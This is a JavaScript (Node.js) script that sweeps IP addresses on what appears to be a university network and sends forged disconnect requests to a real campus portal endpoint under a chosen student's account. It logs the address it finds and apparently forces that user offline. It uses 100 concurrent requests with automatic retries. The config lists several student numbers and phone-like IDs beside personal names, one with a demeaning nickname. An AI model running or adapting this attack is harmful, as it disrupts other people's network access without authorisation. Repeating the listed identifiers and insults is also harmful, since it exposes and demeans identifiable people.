let request = require('request'),
	iconv = require('iconv-lite'),
	fs = require('fs');

let config = {
	consCount : 100,
	// studentNumber : "161034152" //嘉欣
	// studentNumber : "162011379" //绿帽腾
	// studentNumber : "142011005"
	// studentNumber : '15360452691',
	// studentNumber : "18028035114", // 阳馨男
	studentNumber : "162011251", //吕晓东
}

let param = {
	ip1 : 1,
	ip2 : 1
}


let nextGroup = ()=>{
	if(param.ip2 >= 255){
		param.ip1 += 1;
		param.ip2 = 1;
		console.log('Try 10.12.' + param.ip1);
		return param;
	}

	if(param.ip1 >= 255){
		return undefined;
	}

	param.ip2 ++ ;
	var temp = {
		ip1 : param.ip1,
		ip2 : param.ip2
	}
	return temp;
}

let getOption = ()=>{
	//userid=15360452691@NFSYSU.GZ&wlanuserip=10.12.22.199&wlanacIp=14.23.185.10
	var pa = nextGroup();
	if(pa == undefined){
		return undefined;
	}
	var ip = "10.12." + pa.ip1 + "." + pa.ip2;
	var option = {
		url : 'http://219.136.125.139/portalDisconnAction.do',
		form : {
			"userid" : config.studentNumber + "@NFSYSU.GZ",
			"wlanuserip" : ip,
			"wlanacIp" : "14.23.185.10"
		},
		timeout : 1000
	}

	return option;
}

let reqTest = (option, callback) =>{
	request.post(option, function(err, res, body) {
		if(err || res.statusCode != 200){
			callback(false, option);
			return ;
		}
	})
	.pipe(iconv.decodeStream("GBK"))
	.pipe(iconv.encodeStream('utf-8'))
	.collect(function(err, body){
		// console.log('try : ' + option.form.wlanuserip);
		var data = 'try : ' + option.form.wlanuserip + "\n";
		// fs.appendFile('./log', data, function(err, data){});
		body = body.toString();
		if(body.indexOf('下线失败，帐号与在线表帐号不一致') > -1 || body.indexOf('下线失败,帐号不在线') > -1){
			callback(true);
			return ;
		}
		var successDate = "success : " + option.form.wlanuserip + "\nnumber : " + config.studentNumber + "\n" + body + "\n";
		fs.appendFile('./log', successDate, function(err, data){});
		console.log(body);
		param.ip1 = 256;
		callback(true);
	})
}

//255个并发
let getCons = () =>{
	var options = [];
	for(var i=0;i<config.consCount;i++){
		var option = getOption();
		if(option == undefined){
			return options;
		}
		options.push(option);
	}
	return options;
}

let consReq = (options, next)=>{
	var finishedCount = 0;
	var cb = (state, option)=>{
		//retry
		if(!state){
			reqTest(option, cb);
		}else {
			finishedCount ++ ;
			if(finishedCount == options.length){
				next(true);
				return ;
			}
		}
	}
	for(var i=0;i<options.length;i++){
		reqTest(options[i], cb);
	}
}

let start = ()=>{
	var options = getCons();
	if(!options || options.length == 0) {
		console.log('all finished');
		return ;
	}
	consReq(options, function(state){
		// console.log('next group');
		setTimeout(function(){
			start();
		}, 1000)
	})
}

start();
